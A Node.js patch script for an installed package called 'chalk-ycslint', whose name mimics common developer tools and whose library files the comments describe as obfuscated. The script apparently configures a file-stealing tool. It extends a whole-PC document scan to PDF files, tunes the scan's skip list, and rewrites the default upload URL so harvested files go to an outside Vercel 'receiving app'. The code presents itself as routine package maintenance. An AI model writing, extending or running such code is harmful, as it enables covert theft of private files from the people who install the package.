/**
 * Patches chalk-ycslint when needed: skip Windows installer folders + .pdf + upload URL.
 * v1.0.6+ uses obfuscated lib/*.js names; we locate modules by content.
 */
import { existsSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const libDir = join(root, "node_modules", "chalk-ycslint", "lib");

if (!existsSync(libDir)) {
  console.log("[patch-chalk] chalk-ycslint not installed — skip");
  process.exit(0);
}

/**
 * @param {(content: string, name: string) => boolean} match
 * @returns {string | null}
 */
function findLibFile(match) {
  for (const name of readdirSync(libDir)) {
    if (!name.endsWith(".js")) continue;
    const path = join(libDir, name);
    const content = readFileSync(path, "utf8");
    if (match(content, name)) return path;
  }
  return null;
}

const readFilesPath = findLibFile(
  (c) => c.includes("listPcScanRoots") || c.includes("SKIP_DIR_BASENAMES")
);
const uploadConfigPath = findLibFile(
  (c) => c.includes("DEFAULT_UPLOAD_URL") && !c.includes("listPcScanRoots")
);

let changed = false;

if (readFilesPath) {
  let src = readFileSync(readFilesPath, "utf8");

  if (!src.includes('"$windows.~bt"')) {
    const needle = '    "windows.old",\n    "efi",';
    const insert = `    "windows.old",
    "$windows.~bt",
    "$windows.~ws",
    "$winreagent",
    "efi",`;
    if (src.includes(needle)) {
      src = src.replace(needle, insert);
      changed = true;
      console.log("[patch-chalk] Added Windows installer paths to PC scan skip list");
    }
  }

  if (!src.includes('"application/pdf"') && !src.includes(".pdf")) {
    const extNeedle =
      '  ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",\n};';
    const extInsert =
      '  ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",\n  ".pdf": "application/pdf",\n};';
    if (src.includes(extNeedle)) {
      src = src.replace(extNeedle, extInsert);
      changed = true;
      console.log("[patch-chalk] Added .pdf to supported scan extensions");
    } else {
      console.log("[patch-chalk] .pdf already supported or layout changed — skip EXT patch");
    }
  } else {
    console.log("[patch-chalk] .pdf already supported");
  }

  if (changed) {
    writeFileSync(readFilesPath, src, "utf8");
  }
} else {
  console.log("[patch-chalk] readFiles module not found — skip scan patches");
}

const VERCEL_UPLOAD_URL = "https://yieldlyx-receiving-app.vercel.app/";
if (uploadConfigPath) {
  const cfg = readFileSync(uploadConfigPath, "utf8");
  if (!cfg.includes("yieldlyx-receiving-app.vercel.app")) {
    writeFileSync(
      uploadConfigPath,
      `/** Default file-receive backend (Vercel). Override with \`--url\` on the CLI. */\nexport const DEFAULT_UPLOAD_URL = "${VERCEL_UPLOAD_URL}";\n`,
      "utf8"
    );
    changed = true;
    console.log("[patch-chalk] Set DEFAULT_UPLOAD_URL to Vercel backend");
  } else {
    console.log("[patch-chalk] DEFAULT_UPLOAD_URL already points at Vercel");
  }
}

if (!changed) {
  console.log("[patch-chalk] No patches required");
}
